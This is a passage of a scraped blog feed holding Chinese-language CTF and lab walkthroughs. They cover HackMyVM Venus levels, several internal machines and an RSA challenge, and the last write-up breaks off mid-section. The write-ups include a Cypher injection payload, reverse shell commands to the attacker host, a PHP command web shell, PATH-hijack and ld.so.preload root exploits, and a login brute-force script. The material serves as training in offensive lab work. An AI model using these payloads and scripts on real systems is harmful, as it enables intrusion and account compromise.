3. **adela 的密码**: `nbhlQyKuaXGojHx`

# **Mission 0x40: adela -&gt; sky**

- **任务**: `sky` 把她的密码保存在可以“听到”的东西里。

1. `adela` 目录下有一个名为 `wtf` 的文件，内容是一串点和划。

   ```bash
   adela@venus:~$ cat wtf
   .--. .- .--. .- .--. .- .-. .- -.. .. ... .
   ```

2. 这明显是摩斯密码。使用在线工具进行翻译，得到 `PAPAPARADISE`。

3. 尝试使用该密码登录失败，但将其转换为小写 `papaparadise` 后成功登录。

4. **sky 的密码**: `papaparadise`

***

# **Flag**

```
31. veronica:      8===iSSeKzoDXsKy8WPuqNPg===D~~
32. lana:          8===um3Hno2AsjFjuLWsfmDj===D~~
33. noa:           8===HUNGevKdeKwcCvJru1CC===D~~
34. maia:          8===nu8IDScKFAXVcnFutKtG===D~~
35. gloria:        8===RZIkEtaEp18tLslTopJj===D~~
36. alora:         8===NSe78N2lM7IbvHzvrC0G===D~~
37. julie:         8===Iwe1QpxTcx0A8Uusqjfe===D~~
38. irene:         8===c9hgLkLGzsNw7mB3VEr4===D~~
39. adela:         8===86XGXQefUeV2eEdrUzxx===D~~
40. sky:           8===8T2IE4fNIvbs8sh1lnew===D~~

Hidden Flags:
40.sky:            8===nyqRAOwkVRTiMYeePdes===D~~
```

# **Pass**

```
31: veronica/QTOel6BodTx2cwX
32: lana/UWbc0zNEVVops1v
33: noa/9WWOPoeJrq6ncvJ
34: maia/h1hnDPHpydEjoEN
35: gloria/v7xUVE2e5bjUcxw
36: alora/mhrTFCoxGoqUxtw
37: julie/sjDf4i2MSNgSvOv
38: irene/8VeRLEFkBpe2DSD
39: adela/nbhlQyKuaXGojHx
40: sky/papaparadise
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Labs_venus31to40.html</guid><pubDate>Fri, 08 Aug 2025 14:57:51 +0000</pubDate></item><item><title>内部_Mayuri</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Mayuri.html</link><description># 一、信息收集

## 1. 主机发现与端口扫描

首先，在本地网络中使用 `arp-scan` 发现目标主机的 IP 地址，随后利用 `nmap` 对其进行全端口扫描，以识别开放的服务。

**主机发现:**
通过 `arp-scan` 扫描，确定目标主机 IP 为 `192.168.205.138`。

```bash
┌──(kali㉿kali)-[~]
└─$ sudo arp-scan -l
...
192.168.205.138 08:00:27:cb:36:de       PCS Systemtechnik GmbH
...
```

**端口扫描与服务识别:**
`nmap` 的扫描结果显示，目标主机开放了 **22 (SSH)**、**80 (HTTP)** 和 **8080 (HTTP-Proxy)** 端口。进一步的服务版本侦测确认了 Web 服务由 Apache 2.4.62 驱动，SSH 服务为 OpenSSH 8.4p1。

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -p- 192.168.205.138
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy

┌──(kali㉿kali)-[~]
└─$ nmap -p22,80,8080 -sC -sV 192.168.205.138
...
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3
80/tcp   open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: 未来道具研究所 | Future Gadget Lab
8080/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: 未来道具研究所 - Labmem 认证
...
```

## 2. Web 服务侦察

*   **80 端口**: 这是一个未来道具研究所的产品查询页面，允许用户通过 `sid` 查询商品信息。
*   **8080 端口**: 这是一个后台登录页面。

# 二、漏洞利用与初始访问

## 1. Cypher 注入漏洞发现与利用

对 80 端口的查询功能进行测试。输入 `' OR 1=1` 时，页面返回了特定的错误信息 `Error in: M?TCH (n:?h?p) whe?re n.sid = ' + sid + ' RET?RN n;`，这表明后端可能使用了 Neo4j 图数据库，并且查询语句是直接拼接构造的，存在 Cypher 注入漏洞。

经过一系列的黑盒测试与构造，最终发现以下 payload 可以绕过限制并泄露数据库中的所有节点信息：

`1 WITH 1 AS dummy MATCH (m) RETURN m AS n //`

**原理分析**:
该 payload 利用了 `WITH` 子句重置查询上下文的特性，并结合别名 `AS n` 欺骗后端应用逻辑，最后通过注释符 `//` 解决语法错误，成功执行了 `MATCH (m)` 以查询所有数据。

**信息泄露:**
执行该注入后，从返回的数据中发现了用户凭据：

*   **用户**: `Okabe`
*   **密码**: `OOOkkkaaabbbeee`

## 2. 获取初始访问权限 (www-data)

使用泄露的凭据 `Okabe:OOOkkkaaabbbeee` 成功登录 8080 端口的后台。后台提供了一个 'D-Mail 终端' 功能，这实际上是一个命令执行后门。

利用该后门执行反弹 Shell 命令，在本地监听并成功获取了一个 `www-data` 用户的 Shell。

**本地监听 (Kali):**

```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 8888
```

**触发反弹 Shell (通过后台终端):**

```bash
busybox nc 192.168.205.128 8888 -e /bin/bash
```

成功获得 `www-data` 权限的交互式 Shell。

# 三、权限提升

## 1. 从 `www-data` 到 `kyoma`

稳定 Shell

```bash
script /dev/null -c bash
Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash
stty rows 24 columns 80
```

在稳定 Shell 后，检查环境变量，发现了一个名为 `Pass` 的变量。

```bash
www-data@Mayuri:/$ env
...
Pass=1.129848
...
```

同时，发现系统中存在用户 `kyoma`。抱着尝试的心态，使用这个密码切换用户。

```bash
www-data@Mayuri:/$ su kyoma
Password: 1.129848
kyoma@Mayuri:/$ id
uid=1001(kyoma) gid=1001(kyoma) groups=1001(kyoma)
```

成功切换到 `kyoma` 用户，并在其家目录下找到第一个 flag `user.txt`。

## 2. 从 `kyoma` 到 `root`

在 `kyoma` 用户的家目录下，发现一个具有 SUID 权限的可执行文件 `TimeMachine`。

```bash
kyoma@Mayuri:~$ ls -al
...
-rwsr-xr-x 1 root root  17208 Aug  6 07:35 TimeMachine
-rw-r--r-- 1 root root     16 Aug  6 08:39 user.txt
```

使用 `strings` 命令分析该文件，发现它调用了 `system` 函数，并执行了包含 `timedatectl` 的命令，但没有使用绝对路径。

```bash
kyoma@Mayuri:~$ strings TimeMachine
...
system
...
timedateH
ctl | grH
ep 'LocaH
l time' H
...
```

这是一个典型的 **PATH 环境变量劫持**漏洞。由于 `TimeMachine` 以 `root` 权限运行，我们可以创建一个同名的恶意脚本，并修改 `PATH` 变量来劫持命令执行流程，从而以 `root` 身份执行任意代码。

**提权步骤:**

1. **创建恶意脚本**: 在 `/tmp` 目录下创建一个名为 `timedatectl` 的脚本，内容为给 `/bin/bash` 添加 SUID 权限。

   ```bash
   kyoma@Mayuri:~$ echo 'chmod +s /bin/bash' &gt; /tmp/timedatectl
   ```

2. **赋予执行权限**:

   ```bash
   kyoma@Mayuri:~$ chmod +x /tmp/timedatectl
   ```

3. **劫持 PATH**: 将 `/tmp` 目录添加到 `PATH` 环境变量的开头。

   ```bash
   kyoma@Mayuri:~$ export PATH=/tmp:$PATH
   ```

4. **触发漏洞**: 执行 SUID 程序 `TimeMachine`。

   ```bash
   kyoma@Mayuri:~$ ./TimeMachine
   ```

   程序执行后，我们的恶意脚本 `/tmp/timedatectl` 会被以 `root` 权限调用，成功为 `/bin/bash` 添加了 SUID 位。

5. **获取 Root Shell**: 使用 `bash -p` 命令启动一个保留有效用户ID（euid）的 Shell，从而获得 `root` 权限。

   ```bash
   kyoma@Mayuri:~$ ls -al /bin/bash
   -rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash
   kyoma@Mayuri:~$ bash -p
   bash-5.0# id
   uid=1001(kyoma) gid=1001(kyoma) euid=0(root) egid=0(root) groups=0(root),1001(kyoma)
   ```

# 四、夺取旗帜

成功获取 `root` 权限后，读取最终的旗帜文件。

```bash
bash-5.0# cat /home/kyoma/user.txt 
flag{1.055821%}

bash-5.0# cat /root/root.txt
flag{1.123581%}
```

渗透测试完成。这一切都是命运石之门的选择。sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Mayuri.html</guid><pubDate>Fri, 08 Aug 2025 13:35:53 +0000</pubDate></item><item><title>内部_Fake</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Fake.html</link><description># 一、信息收集

## 1. 主机发现与端口扫描

首先，在本地网络中使用 `arp-scan` 发现目标主机的 IP 地址，随后利用 `nmap` 对其进行全端口扫描，以识别开放的服务。

**主机发现:**
通过 `arp-scan` 扫描，确定目标主机 IP 为 `192.168.205.136`。

```bash
┌──(kali㉿kali)-[~]
└─$ sudo arp-scan -l
...
192.168.205.136 08:00:27:f7:e4:36       PCS Systemtechnik GmbH
...
```

**端口扫描:**
`nmap` 的扫描结果显示，目标主机开放了 **22 (SSH)** 和 **80 (HTTP)** 端口。

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -p- 192.168.205.136
...
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
...
```

## 2. Web 服务侦察

访问 80 端口的 Web 服务，发现是一个标准的网站模板。在查看网页源代码时，发现一条关键注释，提示监听特定端口。

```html
&lt;!-- Pay attention to listen 12345 --&gt;
```

这个线索暗示目标主机可能会在 UDP 12345 端口上泄露某些信息。

# 二、初始访问

## 1. 发现并捕获 SSH 私钥泄露

根据 Web 源码中的提示，使用 `tcpdump` 监听目标主机与 UDP 12345 端口相关的流量。很快，我们捕获到目标主机正在广播一个经过加密的 SSH 私钥。

```bash
┌──(kali㉿kali)-[~]
└─$ sudo tcpdump -A host 192.168.205.136 and port 12345
...
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDli31tjr
...
```

**注意**：使用 `tcpdump` 命令行工具可能会因数据包分片而导致私钥捕获不完整。在此场景下，启动 `Wireshark` 图形化界面并使用'追踪流' -&gt; 'UDP流'功能，可以确保捕获到完整的私钥。

![image-20250807220801182](http://7r1UMPHK.github.io/image/20250807220801567.webp)

## 2. 破解私钥密码并爆破用户名

我们将捕获到的完整私钥保存为 `id_rsa` 文件。尝试直接使用该私钥登录失败，表明它被密码保护。

在尝试连接 SSH 时，我们收到了一个包含 'jocke?' 艺术字的横幅，这是破解密码的关键提示。

经过尝试，确认私钥的密码就是 `jocke`。

接下来是确定用户名。由于私钥中通常包含的用户名信息已被移除，我们编写了一个简单的脚本来爆破用户名。最终发现用户名为 `jockey`。

```bash
┌──(kali㉿kali)-[/tmp]
└─$ c='abcdefghijklmnopqrstuvwxyz'; for (( i=0; i&lt;${#c}; i++ )); do echo 'jocke${c:$i:1}'; done &gt; user

┌──(kali㉿kali)-[/tmp]
└─$ while read -r u;do echo '$u';ssh -i id_rsa '$u@192.168.205.136' -o PasswordAuthentication=no;done &lt; user
...
jockey
...

┌──(kali㉿kali)-[/tmp]
└─$ ssh jockey@192.168.205.136 -i id_rsa
Enter passphrase for key 'id_rsa': [输入 jocke]
...
[rbash]:$
```

成功登录后，发现我们被限制在一个 `rbash` (Restricted Bash) 环境中，许多常用命令无法执行。

# 三、权限提升

## 1. 从受限 Shell 到可用 Shell

在 `rbash` 环境中，通过 `ls` 和 `cat` 等有限的命令进行探索，发现了两个关键点：

*   **用户 Flag**: `user.txt` 位于家目录下，可以直接读取。
*   **Web 后门**: 在 `/var/www/html/jockey_hack/` 目录下存在一个名为 `test.php` 的文件，这是一个简单的命令执行后门。

```php
&lt;?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?&gt;
```

利用这个后门，我们可以在本地监听端口，并通过 `curl` 访问该 PHP 文件来获取一个反向 Shell。

**本地监听:**

```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 8888
```

**触发反弹 Shell:**

```bash
┌──(kali㉿kali)-[~]
└─$ curl 'http://192.168.205.136/jockey_hack/test.php?cmd=busybox+nc+192.168.205.128+8888+-e+/bin/bash'
```

获取到的新 Shell 虽然是 `bash`，但其环境变量 `PATH` 被修改，导致命令无法正常使用。通过 `jockey` 用户家目录下的 `.bashrc` 文件可以确认这一点。我们首先需要手动设置一个正常的 `PATH` 环境变量来恢复 Shell 的功能。

```bash
jockey@Fake:~$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

## 2. 从 `jockey` 用户到 `backup` 用户

在 `jockey` 的家目录中，一个名为 `note.txt` 的文件写着 'I like to backup.'，这强烈暗示 `backup` 用户是下一个目标。通过 `cat /etc/passwd` 我们发现 `backup` 用户存在，但其登录 Shell 被设置为 `/usr/sbin/nologin`。

然而，经过检查发现 `/usr/sbin/nologin` 文件实际上是一个被替换的 `/bin/bash` 副本，这是一个隐藏的后门。

```bash
jockey@Fake:~$ dpkg -V
...
??5??????   /usr/bin/passwd
...
??5??????   /usr/sbin/nologin

jockey@Fake:/tmp$ ls -al /usr/sbin/nologin
-rwxr-xr-x 1 root root 1168776 May 18 23:38 /usr/sbin/nologin

jockey@Fake:/tmp$ diff /usr/sbin/nologin /bin/bash

```

接下来，使用 `hydra` 对 `backup` 用户的 SSH 密码进行爆破，成功获得密码 `12345`。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ hydra -l backup -P /path/to/password-list.txt ssh://192.168.205.136
...
[22][ssh] host: 192.168.205.136   login: backup   password: 12345
```

使用新凭据登录 `backup` 用户。

## 3. 从 `backup` 用户到 `root`

登录 `backup` 用户后，在其家目录 `/var/backups` 下，发现了一个名为 `passwd_bak` 的文件。通过与系统当前的 `/usr/bin/passwd` 文件进行对比，发现后者已被修改。

```bash
backup@Fake:~$ which passwd
/usr/bin/passwd
backup@Fake:~$ diff passwd_bak /usr/bin/passwd
Binary files passwd_bak and /usr/bin/passwd differ
```

使用 `strings` 命令分析被修改的 `/usr/bin/passwd` 文件，发现它会加载一个恶意的共享库：`/etc/.libc/evil.so`。

继续分析 `/etc/.libc/evil.so`，发现它会在被加载时执行一个脚本 `/var/backups/evil.sh`。

由于 `backup` 用户对 `/var/backups` 目录有写入权限，我们可以利用这个机制进行提权。

1. **创建 Payload**: 创建 `/var/backups/evil.sh` 脚本，内容为给 `/bin/bash` 添加 SUID 权限，并赋予其可执行权限。

   ```bash
   backup@Fake:~$ echo 'chmod +s /bin/bash' &gt; /var/backups/evil.sh
   backup@Fake:~$ chmod +x /var/backups/evil.sh
   ```

2. **触发木马**: 执行被修改过的 `passwd` 命令。该命令拥有 SUID root 权限，因此它加载的 `evil.so` 库以及执行的 `evil.sh` 脚本都将以 root 身份运行。

   ```bash
   backup@Fake:~$ passwd
   ```

3. **获取 Root Shell**: `passwd` 命令执行后，`/bin/bash` 就被设置了 SUID 位。此时，我们只需执行 `bash -p` 即可获得一个 root 权限的 Shell。

   ```bash
   backup@Fake:~$ ls -al /bin/bash
   -rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash
   backup@Fake:~$ bash -p
   bash-5.0# id
   uid=34(backup) gid=34(backup) euid=0(root) egid=0(root) groups=0(root),34(backup)
   ```

# 四、夺取旗帜

成功获取 `root` 权限后，读取最终的旗帜文件。

```bash
bash-5.0# cat /home/jockey/user.txt
flag{user-7fc904f5c88c07c18b558dc203729555}

bash-5.0# cat /root/root.txt
flag{root-3a7d567ac33be7bb8a77a7ce96d35913}
```

渗透测试完成。sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Fake.html</guid><pubDate>Fri, 08 Aug 2025 00:29:51 +0000</pubDate></item><item><title>内部_Xuanji</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Xuanji.html</link><description>![image-20250807122524603](http://7r1UMPHK.github.io/image/20250807122557994.webp)

# **一、信息收集**

## 1. 主机发现与端口扫描

首先在本地网络中使用 `arp-scan` 确定目标主机的IP地址，随后利用 `nmap` 对其进行全端口扫描，以识别开放的服务。

**主机发现:**

```bash
┌──(kali㉿kali)-[~]
└─$ sudo arp-scan -l
...
192.168.205.135 08:00:27:03:7d:ae       PCS Systemtechnik GmbH
...
```

**端口扫描:**

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -p- 192.168.205.135
...
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
...
```

扫描结果表明，目标主机IP为 `192.168.205.135`，开放了 **22 (SSH)** 和 **80 (HTTP)** 端口。

## 2. Web服务侦察

访问80端口的Web服务，发现是一个要求输入Google OTP（动态口令）的登录页面。这表明身份验证是进入系统的首要障碍。

# **二、漏洞发现与利用**

## 1. 发现`.git`源码泄露

针对Web目录进行深度扫描，发现存在一个公开的 `.git` 目录。这是一个严重的信息泄露漏洞，意味着整个Web应用的源代码和版本控制历史都可能被获取。

```bash
┌──(kali㉿kali)-[~]
└─$ dirsearch -u http://192.168.205.135 
...
[00:31:43] 301 -  317B  - /.git  -&gt;  http://192.168.205.135/.git/
...
```

## 2. 还原Git仓库并审计历史记录

使用 `git-dumper` 工具将泄露的 `.git` 仓库完整地下载到本地。

```bash
┌──(kali㉿kali)-[/tmp]
└─$ git-dumper http://192.168.205.135 .
...
[-] Running git checkout .
从索引区更新了 1 个路径
```

进入还原后的仓库目录，使用 `git log -p` 命令审查提交历史。在历史记录中发现了一个关键线索：开发人员曾将一个字符串作为注释添加到了 `index.php` 文件中，随后又在下一次提交中将其删除。

```bash
┌──(kali㉿kali)-[/tmp]
└─$ git log -p
...
commit 189e0034eedd9d026e9d691c9782c72ee51940a1
Author: Your Name &lt;you@example.com&gt;
...
-&lt;!-- 3XKWRL4MDQ5YYPZSYBPDGFLHFA  --&gt;

commit 3dc42d3b5f90552544550d2e09b661fcb114bfe4
Author: Your Name &lt;you@example.com&gt;
...
+&lt;!-- 3XKWRL4MDQ5YYPZSYBPDGFLHFA  --&gt;
...
```

这个被添加后又删除的字符串 `3XKWRL4MDQ5YYPZSYBPDGFLHFA` 符合Base32编码格式，极有可能是用于生成Google Authenticator动态口令的**共享密钥 (TOTP Secret Key)**。

### 3. 初始访问：利用TOTP密钥登录

利用在线TOTP生成工具（如`https://totp.skae.top/`），将获取到的密钥输入，即可实时生成有效的6位动态口令。

使用生成的动态口令成功登录系统，进入一个后台的Web Shell（命令执行窗口）。

### 4. 获取稳定Shell

Web Shell 使用起来极为不便，因此通过执行反向shell命令，在本地Kali攻击机上获取一个稳定的、交互式的 `www-data` 用户权限Shell。

**本地监听:**

```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 8888
```

**Web Shell中执行:**

```sh
busybox nc 192.168.205.128 -e /bin/bash
```

成功接收到反弹shell后，通过 `script` 和 `stty` 等命令将其升级为功能完整的TTY终端。

# **三、权限提升**

## 1. 发现提权向量

在获取 `www-data` shell后，上传并运行自动化Linux提权检查脚本 `linpeas.sh`。分析其输出报告，发现一个致命的配置错误。

```
╔══════════╣ Checking misconfigurations of ld.so
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#ldso
...
You have write privileges over /etc/ld.so.preload
```

`www-data` 用户对 `/etc/ld.so.preload` 文件拥有写入权限。该文件用于指定在任何程序运行前需要预加载的动态链接库。这是一个经典的、高成功率的Linux提权向量。

## 2. 利用`ld.so.preload`实现提权

1. **编写恶意代码**: 在 `/tmp` 目录下创建一个名为 `exp.c` 的C语言文件，其功能是在库被加载时，将当前进程的权限提升为root，并启动一个bash shell。

   ```c
   #include &lt;stdio.h&gt;
   #include &lt;sys/types.h&gt;
   #include &lt;unistd.h&gt;
   #include &lt;stdlib.h&gt;
   
   void __attribute__((constructor)) init() {
       unlink('/etc/ld.so.preload');
   
       setgid(0);
       setuid(0);
   
       execl('/bin/bash', 'bash', '--norc', '--noprofile', NULL);
   
   
       execl('/bin/sh', 'sh', NULL);
   }
   ```

2. **编译共享库**: 使用 `gcc` 将C代码编译成一个共享库文件 `exp.so`。

   ```bash
   www-data@Xuanji:/tmp$ gcc -fPIC -shared -o exp.so exp.c -nostartfiles
   ```

3. **触发Payload**: 将我们恶意共享库的路径写入 `/etc/ld.so.preload` 文件。

   ```bash
   www-data@Xuanji:/tmp$ echo '/tmp/exp.so' &gt; /etc/ld.so.preload
   ```

4. **激活提权**: 执行任何一个以root权限运行的SUID程序（如`sudo`）来触发预加载。

   ```bash
   www-data@Xuanji:/tmp$ sudo -l
   ```

   该命令会立即被我们预加载的库劫持，从而以root权限执行 `exp.so` 中的代码。

## 3. 夺取旗帜

成功获取 `root` 权限的shell后，直接读取用户和根目录下的旗帜文件。

```bash
bash-5.0# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
bash-5.0# cat /root/root.txt /home/ahiz/user.txt 
flag{root-076ffb6ef92e5709fc8eda05872419e5}
flag{user-60b725f10c9c85c70d97880dfe8191b3}
```

渗透测试完成。

# 题外话

Google OTP那里，你可以做一回爆破仙人，已知Google OTP是6位数字，30s更新一次

所以直接爆破，有极大概率爆破的出来

![image-20250807122825244](http://7r1UMPHK.github.io/image/20250807122825458.webp)

![image-20250807123315958](http://7r1UMPHK.github.io/image/20250807123316264.webp)

这是也是一个办法，当然这是非常规思路

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Xuanji.html</guid><pubDate>Thu, 07 Aug 2025 07:52:13 +0000</pubDate></item><item><title>Challenge 090</title><link>https://7r1UMPHK.github.io/post/Challenge%20090.html</link><description>![image-20250806202931588](http://7r1UMPHK.github.io/image/20250806202940843.webp)

# 题目回顾

该题目提供了一组 RSA 加密的参数，包括公钥指数 `e`、两个大素数 `p` 和 `q`，以及密文 `c`。要求我们解密出原始明文 `m`。

# **已知参数**

* **公钥指数 (e):**

  ```
  e = 15
  ```

* **素数 (p):**

  ```
  p = 5787222305777209512262474249244794237065756326718637677563926399912102998238238932691915883680852764360339657453541520126740501334731391462921270092825561
  ```

* **素数 (q):**

  ```
  q = 10111241397646344099231145262379017618139453896281400953386716762942327959742747939245765751686811392320346902374279922240577945339761221088737443752162629
  ```

* **密文 (c):**

  ```
  c = 32966311998568049751620491316882873597067466204334745472749990770205777075918461832930873069801888997659326011373601710520150688126730186357963781365253139365104376745890253761612763280897233928482429448491903090758335034298212464171556884740072764043302348824188102589373055730702026853687688157030795220298
  ```

借助了群友的神力

![image-20250806222111843](http://7r1UMPHK.github.io/image/20250806222112003.webp)

```
import gmpy2
import libnum

e= 15
p=5787222305777209512262474249244794237065756326718637677563926399912102998238238932691915883680852764360339657453541520126740501334731391462921270092825561 
q=10111241397646344099231145262379017618139453896281400953386716762942327959742747939245765751686811392320346902374279922240577945339761221088737443752162629
c=32966311998568049751620491316882873597067466204334745472749990770205777075918461832930873069801888997659326011373601710520150688126730186357963781365253139365104376745890253761612763280897233928482429448491903090758335034298212464171556884740072764043302348824188102589373055730702026853687688157030795220298
n=p*q

gcd_q = gmpy2.gcd(e, q - 1)  # 1
d = gmpy2.invert(e, q - 1)
m = pow(c, d, q)
print(libnum.n2s(int(m)))
```

# 解题思路

## 1. 发现问题

标准的 RSA 解密流程需要计算私钥 `d`，其中 `d` 是 `e` 模 `φ(n)` 的乘法逆元，即 `d = e⁻¹ mod φ(n)`，而 `φ(n) = (p-1)(q-1)`。计算该逆元的前提是 `e` 和 `φ(n)` 必须互素，即 `gcd(e, φ(n)) = 1`。

我们来检查这个条件：

*   `e = 15 = 3 * 5`
*   `p - 1` 的末尾是 `0`，因此 `p-1` 是 `5` 的倍数。
*   这意味着 `φ(n) = (p-1)(q-1)` 也是 `5` 的倍数。
*   所以 `gcd(e, φ(n))` 至少为 `5`，不等于 `1`。

**结论：** 无法通过标准方式计算私钥 `d` 来直接对模 `n` 解密。

## 2. 柳暗花明

虽然 `e` 和 `φ(n)` 不互素，但解密仍有可能。我们可以尝试利用中国剩余定理的思想，分别在模 `p` 和模 `q` 的意义下进行解密。这需要 `e` 与 `p-1` 或 `q-1` 互素。

我们来检查 `e` 与 `p-1` 和 `q-1` 的最大公约数：

*   `gcd(e, p - 1)`: 因为 `p-1` 是 `5` 的倍数，所以 `gcd(15, p - 1) = 5`。我们无法在模 `p` 的意义下直接求逆。
*   `gcd(e, q - 1)`: 经过计算，`gcd(15, q - 1) = 1`。

**结论：** 我们可以计算 `e` 在模 `q-1` 下的逆元，从而在模 `q` 的意义下恢复明文。

## 3. 解密原理

既然 `gcd(e, q - 1) = 1`，我们可以计算出 `d_q` 满足：
`d_q ≡ e⁻¹ (mod q - 1)`

根据 RSA 的加密过程，我们有：
`c ≡ m^e (mod n)`

这也意味着：
`c ≡ m^e (mod q)`

两边同时取 `d_q` 次方：
`c^d_q ≡ (m^e)^d_q ≡ m^(e*d_q) (mod q)`

由于 `e*d_q ≡ 1 (mod q - 1)`，我们可以将其写成 `e*d_q = k*(q-1) + 1` 的形式（其中 k 是某个整数）。代入上式：
`c^d_q ≡ m^(k*(q-1) + 1) ≡ m * (m^(q-1))^k (mod q)`

根据费马小定理，`m^(q-1) ≡ 1 (mod q)`。因此：
`c^d_q ≡ m * 1^k ≡ m (mod q)`

这样，我们就得到了 `m' = m mod q`。在 CTF 竞赛中，如果明文本身不是一个非常大的数字（即 `m &lt; q`），那么我们计算出的 `m'` 就等于原始明文 `m`。

# 小技巧总结

| 条件                | 能否解密 | 解密方式                                |
| :------------------ | :------- | :-------------------------------------- |
| `gcd(e, φ(n)) == 1` | ✅        | 标准 RSA 解密，`d = inverse(e, φ(n))`   |
| `gcd(e, p−1) == 1`  | ✅        | 可在 `mod p` 意义下解密，得到 `m mod p` |
| `gcd(e, q−1) == 1`  | ✅        | 可在 `mod q` 意义下解密，得到 `m mod q` |
| `gcd(e, p−1) &gt; 1`   | ❌        | 无法直接求 `e` 模 `p-1` 的逆元          |
| `gcd(e, q−1) &gt; 1`   | ❌        | 无法直接求 `e` 模 `q-1` 的逆元          |

# 最终结果

运行上述代码后，我们成功得到明文：

```
next_time_make_sure_to_choose_the_appropriate_e_788403071518
```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20090.html</guid><pubDate>Wed, 06 Aug 2025 14:30:14 +0000</pubDate></item><item><title>内部_Team</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Team.html</link><description>![image-20250806132045628](http://7r1UMPHK.github.io/image/20250806132045831.webp)

# **一、信息收集**

## 1. 主机与端口发现

使用 `arp-scan` 和 `nmap` 在本地网络进行扫描，发现目标主机IP地址为 `192.168.205.129`，并确认其开放了 22 (SSH), 80 (HTTP) 和 3000 (HTTP) 端口。

**主机发现:**

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
...
192.168.205.129 08:00:27:43:d1:3f       PCS Systemtechnik GmbH
...
```

**端口扫描:**

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p- 192.168.205.129
...
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp
...
```

# 2. Web服务侦察

*   **80端口**: 运行一个名为 'Maze Security' 的静态公司网站。目录扫描发现 `index.php`，但与主页内容相同，未发现明显漏洞。
*   **3000端口**: 运行一个Web应用，页面标题为 'Dashboard - Semaphore UI'。这是一个关键线索，表明目标正在使用 Ansible Semaphore。

# **二、漏洞发现与利用**

## 1. 版本识别与CVE发现

对3000端口的Web应用进行深入分析，在其加载的JavaScript文件 `chunk-vendors.54e1419.js` 中，发现了明确的版本信息：**Ansible Semaphore v2.7.2**。

针对该特定版本进行漏洞搜索，迅速定位到一个已公开的严重漏洞：**CVE-2023-39059**。

*   **漏洞类型**: 远程代码执行 (RCE)
*   **影响版本**: v2.8.90 及更早版本
*   **攻击向量**: 攻击者可以通过向任务的 'Extra Variables' (额外变量) 参数注入恶意的 `ansible-playbook` 负载来执行任意代码。
*   **利用前提**: 需要一个低权限的普通用户账户。

## 2. 初始访问 (暴力破解)

根据漏洞信息，首要目标是获取一个有效的用户凭据。使用自定义的Python脚本，结合常见用户名和密码字典，对 `/api/auth/login` 接口进行暴力破解攻击。

```python
import requests
import threading
import queue
import sys

t = queue.Queue()
r = requests.Session()
h = {
    'Host': '192.168.205.252:3000',
    'User-Agent': 'Mozilla/5.0',
    'Accept': 'application/json, text/plain, */*',
    'Accept-Encoding': 'gzip, deflate, br',
    'Content-Type': 'application/json',
    'Origin': 'http://192.168.205.252:3000',
    'Connection': 'keep-alive',
    'Referer': 'http://192.168.205.252:3000/auth/login'
}

found = False
found_lock = threading.Lock()

def l(u, p):
    global found
    if found:
        return
    try:
        b = f'{{'auth':'{u}','password':'{p}'}}'.encode()
        x = r.post('http://192.168.205.252:3000/api/auth/login', data=b, headers=h, timeout=5)
        status = x.status_code
        if status != 401:
            with found_lock:
                if not found:
                    found = True
                    print(f'\n{u}:{p}')
                    print(f'{u}:{p} | {status} | {len(x.content)}')
                    # 停止所有线程
                    for _ in range(20):
                        t.put(None)
        else:
            print(f'{u}:{p} | 401')
    except Exception as e:
        print(f'{u}:{p} | ERR')

def w():
    while True:
        job = t.get()
        if job is None or found:
            t.task_done()
            break
        l(*job)
        t.task_done()

def m():
    th = []
    for _ in range(20):
        x = threading.Thread(target=w)
        x.start()
        th.append(x)

    with open('user', 'r') as uf:
        users = [line.strip() for line in uf if line.strip()]
    with open('rockyou.txt', 'r', encoding='latin1') as pf:
        for p in pf:
            p = p.strip()
            if not p or found:
                continue
            for u in users:
                if found:
                    break
                t.put((u, p))
            if found:
                break

    t.join()

    for x in th:
        x.join()

if __name__ == '__main__':
    m()
```

经过尝试，成功爆破出一组凭据：

```
[+] 成功: root:password123
状态码: 204, 响应长度: 0
```

## 3. 远程代码执行 (RCE)

使用 `root:password123` 凭据成功登录到 Ansible Semaphore UI。

### 3.1 障碍分析

在UI中发现一个名为 `test` 的预置任务。直接尝试运行该任务失败。查看任务日志发现，任务在执行Playbook之前因无法克隆Git仓库而失败，错误信息为 `Failed updating repository: exit status 128`。这意味着他配置的仓库有问题。

### 3.2 绕过障碍并执行Payload

